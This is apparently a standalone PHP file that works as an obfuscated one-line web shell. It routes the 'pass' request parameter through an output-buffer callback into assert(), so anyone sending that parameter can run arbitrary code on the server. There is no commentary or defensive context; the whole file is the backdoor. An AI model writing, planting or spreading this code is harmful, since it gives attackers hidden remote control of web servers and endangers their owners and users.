<?php 
ob_start(function ($c,$d){register_shutdown_function('assert',$c);}); 
echo $_REQUEST['pass']; 
ob_end_flush(); 
?>
